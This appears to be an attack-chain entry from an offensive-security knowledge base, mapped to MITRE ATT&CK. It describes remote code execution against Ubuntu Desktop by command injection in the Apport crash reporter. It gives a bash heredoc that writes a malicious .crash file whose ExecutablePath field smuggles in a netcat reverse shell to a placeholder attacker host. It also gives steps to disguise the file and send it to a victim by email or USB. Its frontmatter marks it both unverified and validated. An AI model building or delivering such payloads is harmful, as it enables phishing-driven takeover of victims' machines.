---
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
tags:
  - rce
  - command-injection
  - apport
  - ubuntu
  - linux
type: attack_chain
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
verified: false
platforms:
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T12:00:00Z'
procedures:
  - '[[procedures/Craft-Malicious-Apport-Crash-File-for-RCE]]'
  - '[[procedures/Deliver-and-Trigger-Apport-Exploit]]'
step_count: 2
techniques:
  - '[[Exploitation for Client Execution]]'
  - '[[T1566.001]]'
updated_at: '2025-12-14T17:23:24.446Z'
description: >-
  Attack chain exploiting command injection in Canonical's Apport software to
  achieve remote code execution by tricking a user into opening a crafted .crash
  file on Ubuntu Desktop 12.10 and later.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploitation for Client Execution]]'
  - '[[T1566.001]]'
---
# RCE via Malicious Crash File in Apport on Ubuntu Desktop

Multi-stage attack chain demonstrating a complete attack workflow exploiting command injection in Apport crash reporting software.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 2 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access: Deliver Malicious File] --> B[Execution: Victim Opens File]
    B --> C[Objective: RCE on Victim Machine]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- Text editor (e.g., vim or nano)
- Email or file sharing service for delivery

### Target Environment

- Ubuntu Desktop 12.10 (Quantal) or later
- Apport installed (default on Ubuntu Desktop)
- User with access to open .crash files

### Initial Access Requirements

- Ability to trick victim into opening the file (e.g., via email attachment or download)
- No prior network access needed; social engineering required

## Detailed Attack Procedures

### Step 1: Craft Malicious Crash File
procedure: [[procedures/Craft-Malicious-Apport-Crash-File-for-RCE]]

**Objective**: Create a specially formatted .crash file that injects and executes arbitrary commands when processed by Apport.

**Instructions**: Use a text editor to generate the .crash file with command injection payload in the Stacktrace or ExecutablePath field, exploiting flaws in Apport's processing (e.g., via gdb command invocation). For example, inject a payload like `; malicious_command #` to break out of the expected format.

```bash
cat > malicious.crash << EOF
ProblemType: Crash
Architecture: i386
CrashCounter: 1
Date: $(date)
ExecutablePath: /bin/ls; nc -e /bin/sh attacker_ip 4444 #
ProcCmdline: ls
ProcEnviron:
ProcStatus:
Signal: 11
StacktraceTop:

EOF
```

**Expected Output**: A valid-looking .crash file (~200 bytes) that, when opened, triggers command injection.

**Success Indicators**:
- File created without syntax errors
- Payload embedded in ExecutablePath or similar field

### Step 2: Deliver and Trigger Exploit
procedure: [[procedures/Deliver-and-Trigger-Apport-Exploit]]

**Objective**: Trick the victim into opening the malicious .crash file, leading to automatic processing by Apport and RCE.

**Instructions**: Send the file via email, USB, or download link, disguised as a legitimate crash report. Once opened (e.g., double-click in file manager), Apport's whoopsie or apport-gui processes it, executing the injected command.

**Expected Output**: Reverse shell or arbitrary command execution on the victim's machine, confirming RCE.

**Success Indicators**:
- Victim opens the file
- Attacker receives callback (e.g., netcat listener connects)
- Command output visible on attacker's side

## Attack Chain Summary

### Key Achievements

1. Successful command injection via crafted .crash file
2. Remote code execution without authentication
3. High-impact compromise of default Ubuntu Desktop installations

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploitation for Client Execution]] Exploitation for Client Execution
- [[T1566.001]] Spearphishing Attachment

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

---
*Last updated: 2023-10-01T12:00:00Z*
